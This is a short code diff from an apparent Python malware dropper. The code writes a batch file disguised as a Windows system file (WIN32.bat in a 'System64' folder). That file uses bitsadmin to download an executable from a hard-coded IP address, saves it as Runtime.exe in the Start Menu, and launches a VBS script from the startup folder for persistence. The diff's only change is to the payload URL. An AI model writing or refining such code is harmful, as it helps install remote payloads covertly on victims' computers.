@@ -28,7 +28,7 @@ if not os.path.exists(path_system64):
     with open(f"{path_system64}\\WIN32.bat", "a") as f:
         f.write(
             f'bitsadmin /transfer mydownloadjob /download /priority FOREGROUND '
-            f'"http://20.93.23.234:8081/dl/runtime" '
+            f'"http://20.93.23.234:8081/dl/runtime.exe" '
             f'"C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\Runtime.exe"\n'
             f'start "" "{path_startup}\\WIN64.vbs"'
         )
